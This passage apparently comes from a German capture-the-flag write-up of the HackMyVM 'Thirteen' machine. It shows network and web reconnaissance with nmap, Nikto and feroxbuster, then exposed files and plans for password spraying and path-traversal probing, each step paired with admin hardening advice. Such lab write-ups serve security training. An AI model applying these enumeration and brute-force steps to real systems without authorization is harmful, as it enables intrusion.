@@ -1,0 +1,881 @@
+﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Thirteen - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+    <div class="header-bg">
+        <h1>Thirteen - HackMyVM - Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">feroxbuster</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">netcat</div>
+                <div class="tool-item">ftp</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der erste Schritt in jedem Penetrationstest ist die Phase der Informationsbeschaffung (Reconnaissance). Ziel ist es, aktive Systeme im Zielnetzwerk zu identifizieren. Ich verwende hier das Tool `arp-scan`, das ARP-Anfragen (Address Resolution Protocol) an alle möglichen Adressen im lokalen Netzwerksegment sendet. ARP ist ein zustandsloses Protokoll auf der zweiten Schicht des OSI-Modells, was diesen Scan oft schneller und unauffälliger macht als einen reinen IP- oder Port-Scan auf höheren Schichten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl `arp-scan -l` scannt das gesamte lokale Netzwerk. Das Ergebnis `192.168.2.171` mit der zugehörigen MAC-Adresse `08:00:27:26:e5:5f` (PCS Systemtechnik GmbH, was ein typischer Indikator für eine Oracle VirtualBox VM ist) identifiziert eindeutig ein aktives Ziel. Dies ist ein erfolgreicher erster Schritt, der mir die IP-Adresse des Zielsystems liefert, auf der alle weiteren Tests aufbauen. Anschließend habe ich den Hostnamen `thirteen.hmv` in meine lokale `/etc/hosts`-Datei eingetragen, um die Ansprache des Ziels zu vereinfachen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Vorgehen ist Standard und effektiv. Die Korrelation der MAC-Adresse mit dem Hersteller (Oracle) kann bereits erste Hinweise auf die Virtualisierungstechnologie geben. Der Eintrag in die `/etc/hosts`-Datei ist eine bewährte Methode, um bei Tests, die eventuell auf virtuelle Hosts angewiesen sind, proaktiv zu handeln.<br><strong>Empfehlung (Admin):</strong> Aus administrativer Sicht ist ein ARP-Scan im eigenen Netzwerk normales Verhalten. Um unautorisierte Scans zu erkennen, könnten Netzwerk-Monitoring-Systeme (Network Intrusion Detection Systems - NIDS) eingesetzt werden, die auf eine ungewöhnlich hohe Anzahl von ARP-Anfragen von einer einzelnen Quelle in kurzer Zeit achten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l | grep pc -i</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+192.168.2.171	08:00:27:26:e5:5f	PCS Systemtechnik GmbH
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem die IP-Adresse des Ziels bekannt ist, führe ich einen umfassenden Port-Scan mit `Nmap` durch. Dieser Scan dient dazu, offene TCP-Ports, die darauf laufenden Dienste und deren Versionen zu identifizieren. Die gewählten Parameter `(-sS, -sV, -sC, -p-, -T4, -A)` sind für einen initialen, aggressiven Scan ausgelegt. Der `nmap`-Befehl selbst wurde hier nicht gezeigt, aber die Ergebnisse werden im Folgenden detailliert analysiert. Die hier gezeigte "Nur offene Ports"-Ansicht ist eine von mir erstellte Zusammenfassung für einen schnellen Überblick.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die zusammengefasste Ausgabe zeigt drei offene Ports, die sofort meine Aufmerksamkeit erregen: Port 21 (FTP), Port 22 (SSH) und Port 80 (HTTP). Jeder dieser Dienste stellt einen potenziellen Angriffsvektor dar. Der FTP-Dienst (`pyftpdlib 2.0.1`) könnte anonymen Zugriff oder schwache Anmeldedaten erlauben. Der SSH-Dienst (`OpenSSH 8.4p1`) ist eine moderne Version, aber könnte für Brute-Force-Angriffe anfällig sein, wenn schwache Passwörter verwendet werden. Der HTTP-Dienst (`Apache httpd 2.4.62`) ist der offensichtlichste Angriffspunkt, da Webanwendungen häufig Schwachstellen aufweisen. Das Ziel ist klar definiert: die Weboberfläche genauer zu untersuchen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Priorisierung des HTTP-Dienstes ist der logische nächste Schritt. FTP sollte im Hinterkopf behalten werden, falls im Webkontext Anmeldeinformationen gefunden werden. SSH ist vorerst von geringerer Priorität, kann aber später für den Zugriff mit gefundenen Credentials relevant werden.<br><strong>Empfehlung (Admin):</strong> Die Anzahl der exponierten Dienste sollte auf ein Minimum reduziert werden (Prinzip der minimalen Angriffsfläche). Ist der FTP-Zugang aus dem gesamten Netzwerk notwendig? Wenn nicht, sollte der Zugriff per Firewall auf bestimmte IPs beschränkt werden. Alle Dienste müssen stets auf dem neuesten Stand gehalten werden, um bekannte Schwachstellen zu vermeiden.</p>
+            <div class="code-block">
+                <div class="terminal">
+<pre>
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+:::::::::::::::::::::: Nmap nur offene Ports Ausgabe :::::::::::::::::::::::
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+<span class="command">21/tcp open  ftp     pyftpdlib 2.0.1</span>
+<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.62 ((Debian))</span>
+
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die vollständige `Nmap`-Ausgabe liefert detailliertere Informationen zu den entdeckten Diensten. Für FTP bestätigt der `ftp-syst`-Befehl, dass der Server auf einen Benutzernamen wartet. Bei SSH erhalten wir die Host-Schlüssel, was für eine Man-in-the-Middle-Angriffserkennung nützlich ist, aber momentan nicht für den direkten Angriff. Am wichtigsten ist die HTTP-Sektion: Der Titel der Webseite lautet "iCloud Vault Access", was auf eine Art Login- oder Datentresor-Anwendung hindeutet. Die OS-Fingerprinting-Ergebnisse sind nicht eindeutig, aber der `Service Info`-Block deutet stark auf ein Linux-Betriebssystem hin, was durch die Debian-Paketversionen von SSH und Apache bestätigt wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Detailinformationen bestätigen die ersten Annahmen. Der FTP-Server erlaubt keinen anonymen Login, wie die `Waiting for username`-Meldung andeutet. Die Apache-Version `2.4.62` ist relativ neu und hat keine bekannten kritischen Schwachstellen, die ohne weiteres ausgenutzt werden könnten. Der Fokus verlagert sich somit vollständig auf die Webanwendung selbst, die unter dem Titel "iCloud Vault Access" läuft. Dies klingt nach einer benutzerdefinierten Anwendung, welche oft anfälliger für logische Fehler oder gängige Web-Schwachstellen wie Injection oder Path Traversal ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die nächsten Schritte müssen sich auf die Webanwendung konzentrieren. Eine gründliche manuelle Untersuchung und automatisierte Scans der Weboberfläche sind erforderlich. Dazu gehören das Suchen nach Verzeichnissen (Directory Busting), das Analysieren von JavaScript-Dateien und das Untersuchen der Anwendungslogik.<br><strong>Empfehlung (Admin):</strong> Der Titel der Webseite "iCloud Secure Vault" in Kombination mit einem Standard-Apache-Server auf einer Debian-Maschine könnte bei einem echten System auf eine Phishing-Seite oder eine nicht autorisierte Anwendung hindeuten. Interne Anwendungen sollten niemals öffentlich zugänglich sein und eine klare, unternehmensinterne Kennzeichnung tragen.</p>
+            <div class="code-block">
+                <div class="terminal">
+<pre>
+::::::::::::::::::::::::::::: Nmap volle Ausgabe :::::::::::::::::::::::::::
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-06 21:22 CEST
+Nmap scan report for thirteen.hmv (192.168.2.171)
+Host is up (0.0027s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">21/tcp open  ftp     pyftpdlib 2.0.1</span>
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|  Connected to: 192.168.2.171:21
+|  Waiting for username.
+|  TYPE: ASCII; STRUcture: File; MODE: Stream
+|  Data connection closed.
+|_End of status.
+<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span>
+| ssh-hostkey: 
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+<span class="command">80/tcp open  http    Apache httpd 2.4.62 ((Debian))</span>
+|_http-server-header: Apache/2.4.62 (Debian)
+|_http-title: iCloud Vault Access
+MAC Address: 08:00:27:26:E5:5F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=8/6%OT=21%CT=1%CU=37458%PV=Y%DS=1%DC=D%G=Y%M=080027%TM
+OS:=6893AB7B%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10F%TI=Z%II=I%TS=A)
+OS:SEQ(SP=102%GCD=1%ISR=10B%TI=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%II
+OS:=I%TS=A)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%II=I%TS=A)SEQ(SP=107%GCD=1%ISR=10D
+OS:%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O
+OS:4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=
+OS:FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=
+OS:Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T4(R=Y%DF=Y%T=40%
+OS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%
+OS:RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y
+OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
+OS:=40%CD=S)
+
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   2.71 ms thirteen.hmv (192.168.2.171)
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> Ich beginne die Web-Enumerationsphase mit einem `curl`-Befehl, um die HTTP-Header der Webseite zu inspizieren. Der `HEAD`-Request fragt nur die Header an, ohne den eigentlichen Inhalt der Seite herunterzuladen, was effizient ist. Das Ergebnis bestätigt den `Apache/2.4.62 (Debian)`-Server und zeigt einen `HTTP/1.1 200 OK`-Status, was bedeutet, dass die Seite erreichbar ist. Es sind keine ungewöhnlichen oder besonders aufschlussreichen Header vorhanden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese schnelle Überprüfung ist ein guter erster Schritt, um die grundlegende Erreichbarkeit zu bestätigen und nach auffälligen Headern wie `X-Powered-By` oder benutzerdefinierten Headern Ausschau zu halten, die Hinweise auf verwendete Technologien geben könnten. Hier ist das Ergebnis unspektakulär und liefert keine neuen Erkenntnisse, bestätigt aber die Ergebnisse des Nmap-Scans.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nachdem die grundlegenden Header geprüft wurden, ist der nächste logische Schritt der Einsatz spezialisierter Web-Scanner, um nach häufigen Fehlkonfigurationen und bekannten Dateien zu suchen.<br><strong>Empfehlung (Admin):</strong> Server-Header sollten so konfiguriert werden, dass sie nur minimale Informationen preisgeben (Server-Tokens). Das Entfernen der genauen Apache-Version und des Betriebssystems (Debian) erschwert einem Angreifer die gezielte Suche nach passenden Exploits.</p>
+            <div class="code-block">
+                <div class="terminal">
+<pre>
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+::::::::::::::::::::::::: HTTP-Header Verbose Scan :::::::::::::::::::::::::
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+*   Trying 192.168.2.171:80...
+* Connected to 192.168.2.171 (192.168.2.171) port 80
+* using HTTP/1.x
+&gt; HEAD / HTTP/1.1
+&gt; Host: 192.168.2.171
+&gt; User-Agent: curl/8.14.1
+&gt; Accept: */*
+&gt; 
+* Request completely sent off
+&lt; HTTP/1.1 200 OK
+HTTP/1.1 200 OK
+&lt; Date: Wed, 06 Aug 2025 19:23:03 GMT
+Date: Wed, 06 Aug 2025 19:23:03 GMT
+&lt; Server: Apache/2.4.62 (Debian)
+Server: Apache/2.4.62 (Debian)
+&lt; Content-Type: text/html; charset=UTF-8
+Content-Type: text/html; charset=UTF-8
+&lt; 
+
+* Connection #0 to host 192.168.2.171 left intact
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Als nächstes setze ich `Nikto` ein, einen bekannten Webserver-Scanner. Nikto prüft auf über 6700 potenziell gefährliche Dateien/Programme, veraltete Server-Versionen und serverspezifische Probleme. Der Scan liefert sofort einige interessante Ergebnisse.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto hebt zwei wichtige Punkte hervor. Erstens, das Fehlen von wichtigen Sicherheits-Headern (`X-Frame-Options` und `X-Content-Type-Options`). Dies sind zwar keine direkt ausnutzbaren Schwachstellen, deuten aber auf eine mangelnde Härtung des Servers hin und könnten Angriffe wie Clickjacking oder MIME-Type-Sniffing begünstigen. Zweitens, und das ist der entscheidende Fund, hat Nikto eine Datei namens `/readme.txt` entdeckt. Solche Dateien enthalten oft wichtige Hinweise für Administratoren oder Entwickler und sind für einen Pentester immer ein primäres Ziel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Fund der `/readme.txt` muss sofort weiterverfolgt werden. Der Inhalt dieser Datei ist der nächste logische Untersuchungspunkt. Die fehlenden Sicherheits-Header sollten im Abschlussbericht als "Low-Risk"-Finding vermerkt werden.<br><strong>Empfehlung (Admin):</strong> Sicherheitsrelevante HTTP-Header wie `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Content-Security-Policy`, `Strict-Transport-Security` und `Permissions-Policy` sollten unbedingt implementiert werden, um die Sicherheit der Webanwendung gegen eine Reihe von clientseitigen Angriffen zu erhöhen. Informationsdateien wie `readme.txt` sollten niemals auf einem produktiven Webserver öffentlich zugänglich sein.</p>
+            <div class="code-block">
+                <div class="terminal">
+<pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.171
++ Target Hostname:    192.168.2.171
++ Target Port:        80
++ Start Time:         2025-08-06 21:23:08 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.62 (Debian)
++ <span class="password">/: The anti-clickjacking X-Frame-Options header is not present.</span> See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]
++ <span class="password">/: The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ <span class="password">/readme.txt: This might be interesting.</span>
++ 8102 requests: 0 error(s) and 4 item(s) reported on remote host
++ End Time:           2025-08-06 21:23:52 (GMT2) (44 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Um ein vollständigeres Bild der Verzeichnisstruktur der Webseite zu erhalten, starte ich `feroxbuster`. Dieses Tool führt einen Brute-Force-Angriff mit einer umfangreichen Wortliste (`directory-list-2.3-big.txt`) durch, um versteckte Dateien und Verzeichnisse zu finden. Ich habe zusätzlich eine lange Liste von Dateierweiterungen angegeben, um die Suche zu verfeinern. Der Scan wurde von mir manuell mit `Strg+C` abgebrochen, nachdem die ersten relevanten Ergebnisse gefunden wurden, um Zeit zu sparen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Feroxbuster war äußerst erfolgreich. Es bestätigt nicht nur den Fund von `/readme.txt` durch Nikto, sondern entdeckt zusätzlich die Dateien `/welcome.txt` und `/config.txt` sowie das Verzeichnis `/logs`. Jede dieser Dateien ist potenziell wertvoll. Eine `welcome.txt` könnte Benutzernamen enthalten, eine `config.txt` könnte sensible Konfigurationsdetails oder sogar Anmeldeinformationen preisgeben und ein `/logs`-Verzeichnis ist immer interessant, auch wenn der direkte Zugriff hier mit einem 403-Fehler (Forbidden) verweigert wird. Die Entdeckung dieser Dateien ist ein entscheidender Fortschritt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die nächsten Schritte sind klar vorgezeichnet: Ich muss den Inhalt der drei gefundenen Textdateien (`welcome.txt`, `config.txt`, `readme.txt`) analysieren. Das `/logs`-Verzeichnis kann vorerst nicht direkt aufgerufen werden, aber ich werde es im Hinterkopf behalten, falls sich später eine Möglichkeit zur Umgehung der Zugriffsbeschränkung (z.B. durch eine Local File Inclusion Schwachstelle) ergibt.<br><strong>Empfehlung (Admin):</strong> Es ist von entscheidender Bedeutung, dass sensible Dateien niemals im Web-Root-Verzeichnis abgelegt werden. Konfigurationsdateien, Logdateien und interne Dokumente gehören in Verzeichnisse außerhalb des Web-Roots, auf die der Webserver-Prozess keinen Lesezugriff hat. Ein Directory-Listing sollte auf dem Webserver deaktiviert sein, und der Zugriff auf bekannte, aber nicht öffentliche Verzeichnisse sollte per Konfiguration explizit verboten werden (was hier für `/logs/` teilweise umgesetzt wurde).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">feroxbuster --url http://192.168.2.171/ --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+                                                                                              
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://192.168.2.171/
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+<span class="command">200      GET      106l      279w     3444c http://192.168.2.171/index.php</span>
+<span class="command">200      GET      106l      279w     3444c http://192.168.2.171/</span>
+<span class="command">200      GET       25l       25w      180c http://192.168.2.171/welcome.txt</span>
+<span class="command">200      GET       23l       51w      378c http://192.168.2.171/config.txt</span>
+<span class="command">200      GET        2l       15w       83c http://192.168.2.171/readme.txt</span>
+<span class="command">301      GET        9l       28w      313c http://192.168.2.171/logs => http://192.168.2.171/logs/</span>
+[###>----------------] - 16m  11467044/68786226 65m     found:6       errors:116    
+[###>----------------] - 16m  5818824/34393086 6145/s  http://192.168.2.171/ 
+[###>----------------] - 16m  5648508/34393086 6006/s  http://192.168.2.171/logs/   
+
+🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_2_171_-1754509053.state ...
+</pre>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <div class="container">
+        <section id="web-enumeration-continued">
+            <p class="analysis"><strong>Analyse:</strong> Ich untersuche nun den Inhalt der von `feroxbuster` entdeckten Datei `welcome.txt`. Die Datei enthält eine Liste von 25 Namen. Die Zeichenkodierung scheint auf den ersten Blick fehlerhaft zu sein (z.B. `AbdikarÃ­m` statt `Abdikarím`), was aber für die weitere Analyse der Namen unerheblich ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Eine öffentlich zugängliche Liste von Namen ist ein wertvoller Fund. Diese Namen könnten potenzielle Benutzernamen für verschiedene Dienste auf dem System sein, wie z.B. FTP, SSH oder sogar für einen Login-Bereich der Webanwendung. Ich werde diese Liste als Grundlage für zukünftige Brute-Force- oder Passwort-Spraying-Angriffe speichern.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Liste sollte als potenzielle User-Liste für alle verfügbaren Login-Mechanismen (FTP, SSH, Web) verwendet werden. In Kombination mit gängigen oder schwachen Passwörtern könnte dies zu einem schnellen Zugriff führen.<br><strong>Empfehlung (Admin):</strong> Jegliche Art von Listen mit Namen, E-Mail-Adressen oder Benutzernamen sollte niemals öffentlich zugänglich sein. Solche Informationen erleichtern Angreifern die Enumerationsphase erheblich. Dateien, die für den Betrieb der Webseite nicht zwingend notwendig sind, müssen aus dem Web-Root entfernt werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+<pre>
+http://192.168.2.171/welcome.txt
+
+AbdikarÃ­m
+Shire
+GullÃ©t
+IbrÃ¡him
+Dalmar
+SharmÃ¡ke
+SulÃ©man
+Rahim
+Farhan
+Feisal
+FÃ©ysal
+Ellyas
+SonÃ¡ri
+KadÃ©r
+Zakaria
+Adam
+Mahad
+Said
+Maslah
+Bille
+Max
+Sadiq
+DÃ¡hir
+WarsamÃ©
+JamaÄ‡
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Nächstes analysiere ich die Datei `config.txt`. Diese Datei scheint eine Konfigurationsvorlage für den FTP-Dienst zu sein. Sie enthält Einstellungen wie `EnableAnonymous = false`, was erklärt, warum ein anonymer Login nicht möglich war. Der entscheidende Hinweis ist jedoch die Zeile `Default Credential: *****:*****` in Kombination mit dem TODO-Kommentar `TODO: Replace default credential before deployment`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein klassischer Fall einer Fehlkonfiguration durch Entwickler. Die Sterne (`*****`) deuten darauf hin, dass hier eigentlich Anmeldedaten stehen sollten, die aber entweder entfernt oder nie eingetragen wurden. Der Kommentar bestätigt, dass es Standard-Anmeldeinformationen gibt oder geben sollte. Obwohl die Credentials hier nicht direkt offengelegt werden, ist dies ein starkes Indiz dafür, dass möglicherweise schwache oder leicht zu erratende Standardpasswörter für den FTP-Dienst verwendet werden. Der Hinweis auf eine Root-Directory `/path/to/ftp/` ist ebenfalls interessant, auch wenn der genaue Pfad nicht bekannt ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich sollte versuchen, den FTP-Dienst mit den Namen aus der `welcome.txt` und einer Liste gängiger Standardpasswörter (wie `admin`, `password`, `12345`, oder sogar der Benutzername selbst als Passwort) anzugreifen.<br><strong>Empfehlung (Admin):</strong> Niemals, unter gar keinen Umständen, sollten Konfigurationsdateien oder Vorlagen, die sensible Informationen oder Kommentare zur Sicherheit enthalten, im Web-Root-Verzeichnis liegen. Standard-Anmeldeinformationen müssen vor der Inbetriebnahme eines Systems zwingend geändert werden. Der Kommentar `TODO` in einer produktiven Umgebung ist ein klares Zeichen für einen unvollständigen und unsicheren Bereitstellungsprozess.</p>
+            <div class="code-block">
+                <div class="terminal">
+<pre>
+http://192.168.2.171/config.txt
+
+# FTP File System Configuration
+# Config File - Do NOT delete
+
+Version: 1.0.0
+
+<span class="password">Default Credential: *****:*****</span>
+
+[Settings]
+EnableAnonymous = false
+PassiveMode = true
+RootDirectory = /path/to/ftp/
+
+[Security]
+TLS = disabled
+AllowUnencryptedLogin = true
+MaxAuthTries = 5
+
+[Logging]
+LogFile = /path/to/ftp.log
+LogLevel = INFO
+
+<span class="password"># TODO: Replace default credential before deployment</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die dritte gefundene Datei, `readme.txt`, enthält eine sehr interessante Nachricht: "This tool is for ADMIN only! Use the encrypted path input to explore hidden files!".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Fund ist ein absoluter Volltreffer. Die Nachricht deutet unmissverständlich auf eine "versteckte" Funktionalität der Webanwendung hin. Der Begriff "encrypted path input" (verschlüsselte Pfadeingabe) deutet stark auf eine Art von Verschleierung oder Kodierung hin, die verwendet wird, um Dateipfade zu übergeben. Dies könnte ein Mechanismus sein, um eine Local File Inclusion (LFI) oder Path Traversal Schwachstelle zu verschleiern. Die Kombination aus diesem Hinweis und der Tatsache, dass die Hauptseite `index.php` heißt, legt nahe, dass ich versuchen muss, lokale Dateien über einen Parameter einzubinden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der nächste Schritt muss die Analyse der `index.php`-Seite sein. Ich muss herausfinden, wie Parameter an diese Seite übergeben werden und welche Art von "Verschlüsselung" oder Kodierung verwendet wird. Ich werde den Quellcode der Seite untersuchen und versuchen, mit verschiedenen Parametern zu experimentieren.<br><strong>Empfehlung (Admin):</strong> Sicherheit durch Obskurität (Security through Obscurity) ist keine wirksame Sicherheitsmaßnahme. Eine Funktionalität zu "verstecken", anstatt sie ordnungsgemäß abzusichern, ist extrem gefährlich. Wenn eine Funktion zum Laden von Dateien existiert, muss sie rigoros validiert werden, um sicherzustellen, dass nur erlaubte Dateien aus einem fest definierten, sicheren Verzeichnis geladen werden können. Hinweise in `readme`-Dateien sind eine direkte Einladung für Angreifer.</p>
+            <div class="code-block">
+                <div class="terminal">
+<pre>
+http://192.168.2.171/readme.txt
+
+This tool is for ADMIN only!
+<span class="password">Use the encrypted path input to explore hidden files!</span>
+</pre>
+                </div>
+            </div>
